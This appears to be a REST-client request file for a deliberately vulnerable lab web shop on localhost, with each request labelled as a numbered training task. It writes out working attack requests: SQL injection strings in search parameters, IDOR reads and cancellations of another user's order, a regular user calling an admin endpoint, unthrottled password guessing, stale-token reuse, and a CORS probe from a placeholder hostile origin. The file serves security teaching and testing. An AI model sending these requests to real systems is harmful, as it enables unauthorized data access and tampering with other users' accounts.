@base = http://localhost:5080

### Health: list products (anonymous)
GET {{base}}/api/products

### --- Task 01: SQL Injection (sortBy is the cleanest injection point) ---
GET {{base}}/api/products/search?name=&sortBy=Price DESC -- 

### Task 01: boolean injection through name
GET {{base}}/api/products/search?name=%' OR '1'='1&sortBy=Name

### --- Auth ---
# @name login
POST {{base}}/api/auth/login
Content-Type: application/json

{ "email": "alice@lab.local", "password": "Password1!" }

###
@token = {{login.response.body.token}}

### Who am I
GET {{base}}/api/auth/me
Authorization: Bearer {{token}}

### --- Task 03: IDOR — Alice reads Bob's order (id 2) ---
GET {{base}}/api/orders/2
Authorization: Bearer {{token}}

### Task 03: IDOR — Alice cancels Bob's order
POST {{base}}/api/orders/2/cancel
Authorization: Bearer {{token}}

### --- Task 04: Function-level — regular user hits admin endpoint ---
GET {{base}}/api/admin/users
Authorization: Bearer {{token}}

### --- Task 06: Brute force — repeat this with wrong passwords, never throttled ---
POST {{base}}/api/auth/login
Content-Type: application/json

{ "email": "alice@lab.local", "password": "wrong" }

### --- Task 07: change password, then reuse the OLD token below ---
POST {{base}}/api/auth/change-password
Authorization: Bearer {{token}}
Content-Type: application/json

{ "currentPassword": "Password1!", "newPassword": "NewPassw0rd!" }

### Task 07: old token still works after password change (vulnerable)
GET {{base}}/api/auth/me
Authorization: Bearer {{token}}

### --- Task 09: permissive CORS — any origin is allowed ---
GET {{base}}/api/products
Origin: https://evil.example
